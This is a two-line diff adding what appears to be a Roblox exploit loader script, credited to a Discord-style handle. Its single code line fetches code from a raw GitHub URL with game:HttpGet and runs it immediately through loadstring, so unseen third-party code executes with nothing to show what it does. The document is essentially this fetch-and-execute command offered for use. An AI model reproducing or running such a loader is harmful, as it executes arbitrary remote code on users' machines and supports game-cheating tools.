@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/9NLK7/93qjoadnlaknwldk/main/main'))()
+--Made By 1kWoof#0143
